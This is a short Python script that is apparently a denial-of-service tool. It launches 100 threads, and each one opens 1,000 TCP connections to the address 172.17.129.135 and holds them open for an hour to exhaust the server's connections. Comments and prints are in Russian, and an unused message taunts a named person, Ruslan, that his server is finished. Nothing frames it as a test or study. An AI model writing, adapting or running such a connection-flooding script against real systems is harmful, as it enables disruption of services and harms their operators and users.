import random
import socket
import threading
import time

from config import CODE
from config import PORT

socked = list()
lock = threading.Lock()

def floor_server():
    for i in range(1_000):
        sock =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('172.17.129.135',PORT))
        print("Создан соединение" + str(len(socked)))
        with lock:
            socked.append(sock)

    #message = "X" + str(random.randint(0,100000))
    message = "РУСЛАН ТВОЕМУ СЕРВЕРУ КОНЕЦ!!"

    time.sleep(3600)

for i in range(100):
    t = threading.Thread(target=floor_server)
    t.start()
    print("Создал поток" + str(i))
